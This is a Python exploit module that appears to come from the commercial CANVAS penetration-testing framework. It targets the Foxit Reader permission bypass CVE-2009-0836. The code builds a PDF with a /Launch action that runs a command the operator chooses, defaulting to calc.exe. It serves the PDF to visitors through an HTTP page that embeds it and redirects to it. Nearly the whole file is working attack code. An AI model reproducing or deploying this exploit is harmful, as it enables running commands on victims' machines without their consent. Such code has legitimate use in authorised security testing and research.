#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from canvasengine import *

from libs.spkproxy import header,body

##pdfMerge is our own extension not part of pyPDF
from libs.pyPdf.pdfMerge import *

NAME='FoxitLaunchit'
DESCRIPTION='Foxit PDF reader permission bypass'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Foxit Software"
##RICH TODO
DOCUMENTATION['Date public']='03/09/09'
DOCUMENTATION['References']='http://www.securityfocus.com/archive/1/archive/1/501623/100/0/threaded'
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']='Foxit Reader 3.0.2009 1301, 3.0 and 2.3'
DOCUMENTATION['CVE Name']='CVE-2009-0836'
DOCUMENTATION['CVE URL']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0836'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['CERT Advisory']=""
DOCUMENTATION['Notes']="""

"""

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP',"2003","Vista"]
PROPERTY['DELIVERY'] = 'HTTP'


NOTES="""
To test from Commandline (no need for fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:FoxitLaunchit -l 192.168.116.1 -p 8080 -d 5555
"""

CHANGELOG="""
"""

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        
        self.clientversion = 1
        self.name          = NAME
        self.source_pdf    = os.path.join("Resources","blank.pdf")
        self.dest_pdf      = '%s.pdf'%(self.name)
        self.command       = "C:/Windows/System32/calc.exe"
        self.htmlfilename  = 'foxit.html'
        return
    
    def makeHTML(self):
        webpage="<HTML>\n"
        webpage+="<EMBED src=\"%s\" ></EMBED>\n"%(self.dest_pdf)
        webpage+="</HTML>\n"
        return webpage
    
    def makesploit(self,clientheader,clientbody):
        
        h=header('SERVER')
        b=body()
        
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
            
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            b.setBody(self.mergePDF())
            h.addHeader('Content-Type','application/pdf')
            
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.dest_pdf)
            h.addHeader('Content-Type','application/pdf')

        return h,b
    
    def mergePDF(self):
        """
        Take the user specified PDF and merge in the vulnerable behaviour
        """
        ##Make the object to execute the command        
        action=DictionaryObject()
        action[NameObject("/Type")]=NameObject("/Action")
        action[NameObject("/S")]=NameObject("/Launch")
        action[NameObject("/NewWindow")]=BooleanObject(True)
        action[NameObject("/F")]=DictionaryObject()                      
                                                                         
        action["/F"][NameObject("/F")]=createStringObject("%s"%(self.command)) 
        
        ##Merge it into our existing pdf
        try:
            merge   = PDFMerge(self.source_pdf, self.dest_pdf)
            new_pdf = merge.addin([action])
            
        except PDFMergeError, err:
            
            self.log(err)
            return None
        
        return new_pdf

    
    def getArgs(self):
        self.host        = self.target.interface
        self.source_pdf  = self.argsDict.get("source_pdf", os.path.join( self.engine.config["canvas_resources"], "blank.pdf" ) )
        self.dest_pdf    = self.getarg("dest_pdf")
        self.command     = self.getarg("command")
        
        ##Tweak supplied command to meet params
        self.command     = self.command.replace(":","")
        self.command     = "/" + self.command
        
        return
    
    def run(self):
        self.getArgs()
        
        ##insert our extra data into the pdf
        mergedpdf = self.mergePDF()
        
        if not mergedpdf:
            ##Something went wrong
            return 0
        
        self.log('Opening %s for output'%(self.dest_pdf))
        fd = file(self.dest_pdf, 'wb+')
        fd.write(mergedpdf)
        fd.close()
        
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

